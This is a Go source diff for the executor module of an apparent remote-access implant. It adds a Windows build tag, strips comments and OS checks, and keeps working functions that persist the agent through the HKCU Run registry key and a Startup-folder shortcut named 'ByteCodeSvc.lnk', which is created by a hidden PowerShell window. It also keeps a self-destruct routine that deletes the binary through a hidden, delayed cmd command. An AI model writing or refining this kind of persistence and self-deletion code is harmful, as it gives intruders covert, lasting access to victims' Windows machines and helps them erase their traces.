@@ -1,3 +1,4 @@
+//go:build windows
 package executor
 
 import (
@@ -5,18 +6,11 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
-	"strings"
 	"syscall"
 	"unsafe"
 )
 
-// addPersistence installs persistence mechanism
 func addPersistence(payload interface{}) (string, error) {
-	if runtime.GOOS != "windows" {
-		return "", fmt.Errorf("persistence only supported on Windows")
-	}
-
 	payloadMap, ok := toMap(payload)
 	method := "registry"
 	if ok {
@@ -39,11 +33,7 @@ func addPersistence(payload interface{}) (string, error) {
 	}
 }
 
-// removePersistence removes installed persistence
 func removePersistence(payload interface{}) (string, error) {
-	if runtime.GOOS != "windows" {
-		return "", fmt.Errorf("only supported on Windows")
-	}
 	payloadMap, ok := toMap(payload)
 	method := "registry"
 	if ok {
@@ -65,7 +55,6 @@ func removePersistence(payload interface{}) (string, error) {
 }
 
 func persistRegistry(exePath string) (string, error) {
-	// Open HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 	advapi32 := syscall.NewLazyDLL("advapi32.dll")
 	regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
 	regSetValueEx := advapi32.NewProc("RegSetValueExW")
@@ -76,14 +65,12 @@ func persistRegistry(exePath string) (string, error) {
 	valueData, _ := syscall.UTF16FromString(exePath)
 
 	var hKey uintptr
-	// HKEY_CURRENT_USER = 0x80000001, KEY_WRITE = 0x20006
 	ret, _, err := regOpenKeyEx.Call(0x80000001, uintptr(unsafe.Pointer(keyPath)), 0, 0x20006, uintptr(unsafe.Pointer(&hKey)))
 	if ret != 0 {
 		return "", fmt.Errorf("RegOpenKeyEx failed: %v", err)
 	}
 	defer regCloseKey.Call(hKey)
 
-	// REG_SZ = 1
 	dataBytes := len(valueData) * 2
 	ret, _, err = regSetValueEx.Call(hKey, uintptr(unsafe.Pointer(valueName)), 0, 1, uintptr(unsafe.Pointer(&valueData[0])), uintptr(dataBytes))
 	if ret != 0 {
@@ -140,7 +127,6 @@ func persistStartupFolder(exePath string) (string, error) {
 	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 	linkName := filepath.Join(startupDir, "ByteCodeSvc.lnk")
 
-	// Use PowerShell to create .lnk shortcut
 	psCmd := fmt.Sprintf(`$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.Save()`, linkName, exePath)
 	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCmd)
 	out, err := cmd.CombinedOutput()
@@ -159,37 +145,18 @@ func removeStartupPersistence() (string, error) {
 	return "Startup shortcut removed", nil
 }
 
-// selfDestruct removes the agent binary and exits
 func selfDestruct() (string, error) {
 	exePath, err := os.Executable()
 	if err != nil {
 		return "", fmt.Errorf("failed to get exe path: %w", err)
 	}
 
-	// Remove identity file
 	os.Remove(".bytecode_id")
 
-	if runtime.GOOS == "windows" {
-		// Windows: use cmd /c to delete after process exits
-		cmd := exec.Command("cmd", "/C", "ping", "127.0.0.1", "-n", "3", ">", "nul", "&", "del", "/f", exePath)
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		cmd.Start()
-	} else {
-		os.Remove(exePath)
-	}
+	cmd := exec.Command("cmd", "/C", "ping", "127.0.0.1", "-n", "3", ">", "nul", "&", "del", "/f", exePath)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Start()
 
-	// Build result string before exit
 	result := fmt.Sprintf("Self-destruct initiated. Binary: %s", exePath)
-
-	// Schedule exit
-	go func() {
-		// Small delay to allow result to be sent
-		var sb strings.Builder
-		for i := 0; i < 100000; i++ {
-			sb.WriteString(".")
-		}
-		os.Exit(0)
-	}()
-
 	return result, nil
 }
